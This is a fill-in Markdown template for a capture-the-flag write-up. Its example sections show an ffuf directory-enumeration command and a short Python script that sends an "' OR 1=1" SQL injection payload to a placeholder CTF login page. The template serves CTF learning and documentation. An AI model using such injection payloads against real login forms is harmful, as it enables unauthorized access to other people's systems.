# [Challenge Name]

> **Event:** CTF Event Name  
> **Category:** Web / Crypto / Pwn / Forensics / Rev / Misc  
> **Difficulty:** Easy / Medium / Hard  
> **Points:** 100  
> **Solved:** Yes ✅

---

## 📋 Challenge Description

> Paste the original challenge description here.

**Given files / links:** `file.zip`, `http://challenge-url.com`

---

## 🔍 Reconnaissance

Describe your initial approach. What did you notice first?

```bash
# Example: directory enumeration
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

What stood out:
- Observation 1
- Observation 2

---

## 💡 Identifying the Vulnerability

Explain what vulnerability or concept you identified and why.

> Example: The login form was vulnerable to SQL injection because error messages revealed the backend query structure.

---

## 🚀 Exploitation

Walk through your exploit step by step. Include all relevant code.

```python
# exploit.py
payload = "' OR 1=1 -- -"

import requests

url = "http://challenge.ctf.com/login"
data = {"username": payload, "password": "anything"}

r = requests.post(url, data=data)
print(r.text)
```

**Output:**
```
Welcome admin! Here is your flag: CTF{example_flag_here}
```

---

## 🚩 Flag

```
CTF{your_flag_here}
```

---

## 🧠 Key Takeaways

- What did you learn from this challenge?
- What would you do differently?
- Any useful resources or references?

**References:**
- [Link to relevant resource](https://example.com)
- [Tool documentation](https://example.com)
